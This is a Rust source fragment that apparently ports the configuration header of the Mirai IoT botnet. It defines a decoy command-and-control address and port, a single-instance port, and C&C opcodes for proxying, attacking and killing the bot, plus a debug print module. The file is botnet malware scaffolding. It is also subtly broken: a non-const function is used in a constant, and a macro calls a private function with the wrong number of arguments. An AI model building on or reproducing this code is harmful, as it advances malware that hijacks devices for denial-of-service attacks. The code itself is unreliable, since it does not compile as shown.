use std::io::{self, Write};
use std::net::Ipv4Addr;
use std::os::raw::{c_char, c_int};
use std::ffi::CStr;

const STDIN: c_int = 0;
const STDOUT: c_int = 1;
const STDERR: c_int = 2;

type BOOL = bool;
const FALSE: BOOL = false;
const TRUE: BOOL = true;

type Ipv4T = u32;
type PortT = u16;

const SINGLE_INSTANCE_PORT: PortT = 48101;

const FAKE_CNC_ADDR: Ipv4T = inet_addr(65, 222, 202, 53);
const FAKE_CNC_PORT: PortT = 80;

const CNC_OP_PING: u8 = 0x00;
const CNC_OP_KILLSELF: u8 = 0x10;
const CNC_OP_KILLATTKS: u8 = 0x20;
const CNC_OP_PROXY: u8 = 0x30;
const CNC_OP_ATTACK: u8 = 0x40;

static mut LOCAL_ADDR: Ipv4T = 0;

fn inet_addr(o1: u8, o2: u8, o3: u8, o4: u8) -> Ipv4T {
    (o1 as u32) << 24 | (o2 as u32) << 16 | (o3 as u32) << 8 | o4 as u32
}

#[cfg(debug_assertions)]
mod debug {
    use super::*;
    use std::fmt::Write as FmtWrite;
    use std::ffi::CString;
    use std::ptr;

    static mut OUTPTR: *mut c_char = ptr::null_mut();

    fn xputc(c: char) {
        unsafe {
            if !OUTPTR.is_null() {
                *OUTPTR = c as c_char;
                OUTPTR = OUTPTR.add(1);
            } else {
                let _ = io::stdout().write(&[c as u8]);
            }
        }
    }

    fn xputs(s: &str) {
        for c in s.chars() {
            xputc(c);
        }
    }

    fn xvprintf(fmt: &str, args: std::fmt::Arguments) {
        let mut buffer = String::new();
        let _ = buffer.write_fmt(args);
        xputs(&buffer);
    }

    #[macro_export]
    macro_rules! xprintf {
        ($($arg:tt)*) => {
            debug::xvprintf(format_args!($($arg)*))
        }
    }

    #[macro_export]
    macro_rules! printf {
        ($($arg:tt)*) => {
            xprintf!($($arg)*)
        }
    }
}

#[cfg(debug_assertions)]
use debug::*;
